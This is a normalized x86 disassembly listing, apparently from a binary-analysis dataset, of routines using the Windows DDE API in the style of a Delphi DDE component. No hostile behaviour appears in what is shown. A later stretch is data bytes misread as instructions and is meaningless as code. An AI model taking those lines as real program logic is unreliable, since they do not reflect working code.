cmp [ eax + 0xc5 ] 0x1
jne r-xdata
mov eax esi
call sub_46e79c
mov ebx eax
test bl bl
jne r-xdata
mov bl 0x1
lea eax [ esi + 0x4 ]
call sub_404120
jmp r-xdata
sub_46e648
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e715
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46e78c
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_404318
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_46e724
jmp r-xdata
mov eax ebx
call sub_46e8b4
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax ebx
call sub_46e794
mov eax [ ebx + 0xc ]
cmp [ eax + 0xc7 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e71c
lea eax [ ebp - 0x8 ]
call sub_404120
retn
mov eax [ ebp - 0x8 ]
call sub_4043e0
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov esi 0x1
inc esi
dec edi
jne r-xdata
cmp al 0x20
jae r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax + esi - 0x1 ]
test al al
jbe r-xdata
lea eax [ ebp - 0x8 ]
call j_sub_4045ec#2
mov [ eax + esi - 0x1 ] 0x20
sub_46e724
push ebx
push esi
push edi
push ecx
mov edi eax
xor ebx ebx
mov eax [ edi + 0xc ]
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
mov eax edi
call sub_46e8b4
cmp [ edi + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0xc6 ] 0x1
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x3e8
push 0x20b0
mov eax [ eax + 0xa8 ]
push eax
mov eax [ edi + 0x8 ]
push eax
push edx
push 0xffffffff
push 0x0
call DdeClientTransaction
mov esi eax
test esi esi
je r-xdata
mov edx esi
mov eax edi
call sub_46e648
push esi
call DdeFreeDataHandle
mov bl 0x1
jmp r-xdata
sub_46e79c
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] 0x0
mov eax [ ebx + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax [ ebx + 0x4 ]
call sub_4043e0
test eax eax
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea edx [ esp + 0x4 ]
push edx
push 0x3e8
push 0x1034
mov eax [ ebx + 0xc ]
mov edx [ eax + 0xa8 ]
push edx
mov edx [ ebx + 0x8 ]
push edx
mov eax [ eax + 0x38 ]
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
test eax eax
jne r-xdata
push 0x3ec
mov eax [ ebx + 0x4 ]
call sub_4045e0
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x8 ] eax
mov [ esp ] 0x1
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
sub_46e854
push ebx
push esi
push ecx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax ebx
call sub_46e894
mov al 0x1
pop edx
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
test edx edx
je r-xdata
push esp
push 0x3e8
push 0x8040
mov ecx [ esi + 0xa8 ]
push ecx
push edx
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
sub_46e894
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
sub_46e8c0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_423aa8
mov [ esi + 0x48 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46e90c
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423af4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_46e94c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_404120
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_46e978
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x48 ] 0x1
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax ebx
call sub_46ea28
pop esi
pop ebx
retn
sub_46e9a4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46ea18
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x8 ]
pop edx
call sub_4082b0
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ea1f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
mov [ ebx + 0x48 ] 0x1
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
call sub_46ea28
sub_46ea28
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46eaaf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3a ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_46d88c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46eab6
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_446f84
mov edx [ ebp - 0x4 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_46d88c
sub_46eabc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46eb3f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push edi
call DdeAccessData
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46eb46
lea eax [ ebp - 0xc ]
call sub_404120
retn
lea eax [ ebp - 0xc ]
mov edx esi
call sub_404318
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
push edi
call DdeUnaccessData
mov eax ebx
call sub_46ea28
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x8000
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_46eb64
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_423dc4
cmp esi [ edi + 0x34 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x34 ] eax
sub_46eb8c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_423aa8
mov edx esi
mov eax [ rw-data ]
call sub_46d8f0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46ebd0
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_46d904
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423af4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_46ec04
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push sub_46ec8f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
lea eax [ ebp - 0x4 ]
push eax
push edx
call DdeAccessData
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ec96
lea eax [ ebp - 0xc ]
call sub_404120
retn
cmp [ esi + 0x42 ] 0x0
je r-xdata
mov edi 0x8000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404318
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ esi + 0x44 ]
call [ esi + 0x40 ]
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_46ecc8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_423aa8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ esi + 0x44 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46ed0c
push ebx
push esi
push edi
push ebp
call sub_40375c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x34 ]
test eax eax
je r-xdata
push eax
call DdeDisconnect
mov eax [ ebp + 0x44 ]
call sub_403390
xor eax eax
mov [ ebp + 0x44 ] eax
inc esi
xor edi edi
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_423af4
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebp + 0x34 ] eax
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_41b654
call sub_403390
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403744
sub_46ed90
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x1008 ] ebx
mov ebx eax
xor eax eax
push ebp
push sub_46eeb0
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46eeb7
lea eax [ ebp - 0x100c ]
mov edx 0x2
call sub_404144
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1001 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1008 ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_404390
mov eax [ ebp - 0x1008 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_46f0dc
mov edi eax
test edi edi
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f254
mov esi eax
mov [ esi + 0x3c ] edi
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_404390
mov edx [ ebp - 0x100c ]
mov eax esi
call sub_46f3b0
mov edx esi
mov eax [ ebx + 0x44 ]
call sub_41b4f8
mov edx ebx
mov eax esi
call sub_423b78
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x1
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_4045e0
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x34 ] eax
sub_46eec4
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_46f200
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov edx ebx
mov eax [ esi + 0x44 ]
call sub_41b7f0
mov eax ebx
call sub_403390
sub_46eef4
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1004 ] ebx
mov ebx eax
xor eax eax
push ebp
push sub_46ef97
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ef9e
lea eax [ ebp - 0x1004 ]
call sub_404120
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1000 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1004 ]
lea edx [ ebp - 0x1000 ]
mov ecx 0x1000
call sub_404390
mov eax [ ebp - 0x1004 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_46f0dc
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
call sub_46eabc
mov esi eax
sub_46efa8
push ebp
mov ebp esp
xor edx edx
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
mov eax edx
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov eax ecx
call sub_46ec04
mov edx eax
sub_46efc8
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_46f0c9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax ebx
call sub_46f200
test eax eax
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1008 ]
mov ecx 0x1000
call sub_404390
mov eax [ ebp - 0x100c ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_46f0dc
mov ebx eax
test ebx ebx
je r-xdata
mov dx [ ebp + 0x8 ]
call sub_46f2cc
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f0d0
lea eax [ ebp - 0x100c ]
call sub_404120
lea eax [ ebp - 0x8 ]
call sub_404120
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax [ ebp + 0x8 ]
push eax
push esi
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4043e0
inc eax
push eax
mov eax [ ebp - 0x8 ]
call sub_4045e0
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov [ ebp - 0x4 ] eax
sub_46f0dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov edi edx
test edi edi
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
call sub_4240cc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
inc esi
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_40452c
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x4 ]
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46f0dc
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4240a0
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
sub_46f1b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_41b654
mov ebx eax
mov eax [ ebx + 0x34 ]
mov edx [ esp ]
call sub_40452c
jne r-xdata
sub_46f200
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_41b654
mov ebx eax
mov eax [ esp ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call DdeCmpStringHandles
test eax eax
jne r-xdata
sub_46f254
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x30 ] ecx
xor edx edx
mov eax esi
call sub_423aa8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46f28c
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423af4
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ esi + 0x38 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_46f2cc
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46f381
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1004 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1004 ]
lea eax [ ebx + 0x34 ]
call sub_404210
cmp si 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f388
lea eax [ ebp - 0x4 ]
call sub_404120
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax si
push eax
mov eax [ ebx + 0x38 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4043e0
inc eax
push eax
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_46f3b0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_404174
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
call sub_4043e0
test eax eax
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
push 0x3ec
mov eax [ ebx + 0x34 ]
call sub_4045e0
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x38 ] eax
sub_46f40c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46f43d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f444
retn
mov eax rw-data
call sub_40d7a0
sub_46f448
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46d29c
mov [ rw-data ] eax
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41acd4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41acd4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41acd4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41acd4
sub_46f4ac
push 0xb3004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ esi + edi * 8 + 0x76680000 ] dh
dec eax
add [ ebp + 0x680000fe ] dh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x680000fe ] dh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x100046f5 ] dh
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x9004033 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xb ] bl
inc esi
add [ eax + eax ] cl
add [ eax ] al
nop
je r-xdata
add [ edi + 0x550000fe ] dh
mov ebp esp
xor eax eax
push ebp
push sub_46f4f9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
inc ebp
js r-xdata
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ es : esi ] 0x18
outsd
jb r-xdata
sbb ecx [ ebx + 0x4f47e803 ]
stc
dec [ ebx - 0x742fd42a ]
retn
jo r-xdata
arpl [ ebp + 0x70 ] sp
je r-xdata
outsd
jb r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f500
retn
add [ eax ] al
add [ esi * 8 + 0x35d80046 ] cl
inc eax
add ah ah
xor eax 0x35e80040
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ eax * 2 + 0x53656c4f ] cl
jns r-xdata
shl [ eax + 0x46f5 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xf5
inc esi
add [ eax ] dl
add ebp eax
mov ch 0x93
stc
dec [ ebx - 0x17fc7410 ]
sub al 0x4d
stc
inc [ ebp - 0x75f58140 ]
imul ebp [ edi + 0x6e ] 0xffffffff
or [ eax ] eax
add [ eax ] al
inc ecx
jo r-xdata
sub edx eax
mov eax ebx
call sub_40476c
outsd
outsb
inc ebp
dec edi
insb
inc ebp
jb r-xdata
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ ecx ] cl
add [ eax ] al
add [ ebp + esi * 8 + 0x46 ] ah
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xe004033 ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
hlt
inc eax
add [ esi + esi * 8 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 8 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
test [ esi ] 0x18
mov eax [ ebx ]
call sub_4045e0
mov edx esi
sub al 0xd
je r-xdata
mov eax [ ebx ]
call sub_408a60
mov esi eax
mov eax [ ebx ]
call sub_4043e0
test eax eax
jle r-xdata
enter 0xf950 0xff
jb r-xdata
pop esi
pop ebx
retn
sub al 0x21
jb r-xdata
mov al [ esi ]
push es
sar [ esi + 0xa ] 0x8a
insd
outsb
je r-xdata
add [ eax ] al
sub_46f678
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_404174
mov eax [ ebx ]
call sub_408a60
mov esi eax
jmp r-xdata
mov eax [ ebx ]
call sub_4043e0
test eax eax
jle r-xdata
pop esi
pop ebx
retn
mov al [ esi ]
sub al 0x21
jb r-xdata
mov eax [ ebx ]
call sub_4045e0
mov edx esi
sub edx eax
mov eax ebx
call sub_40476c
mov eax [ ebx ]
call sub_408a60
mov esi eax
sub al 0xd
je r-xdata
sub_46f6c8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_46f76f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx edi
call sub_4041b8
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_40bdd0
mov [ ebx + 0xc ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f776
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404144
retn
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40b430
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406030
